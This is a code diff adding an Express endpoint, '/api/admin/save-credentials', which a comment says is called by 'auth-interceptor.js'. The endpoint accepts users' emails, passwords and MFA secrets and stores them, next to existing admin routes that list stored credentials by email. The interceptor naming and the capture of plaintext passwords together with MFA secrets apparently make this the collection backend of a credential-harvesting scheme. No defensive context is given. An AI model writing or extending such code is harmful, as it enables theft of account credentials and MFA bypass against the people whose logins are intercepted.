@@ -41,6 +41,25 @@ async function startServer() {
   app.get("/api/admin/credentials", getCredentials);
   app.get("/api/admin/credentials/:email", getCredentialByEmail);
   
+  // POST endpoint to save client credentials (called by auth-interceptor.js)
+  app.post("/api/admin/save-credentials", async (req, res) => {
+    try {
+      const { email, password, mfaSecret } = req.body;
+      
+      if (!email || !password) {
+        return res.status(400).json({ error: "Email and password are required" });
+      }
+      
+      const { saveClientCredentials } = await import("../adminDb");
+      await saveClientCredentials(email, password, mfaSecret || null);
+      
+      res.json({ success: true });
+    } catch (error: any) {
+      console.error("[Admin] Error saving credentials:", error);
+      res.status(500).json({ error: error.message || "Internal server error" });
+    }
+  });
+  
   // tRPC API
   app.use(
     "/api/trpc",
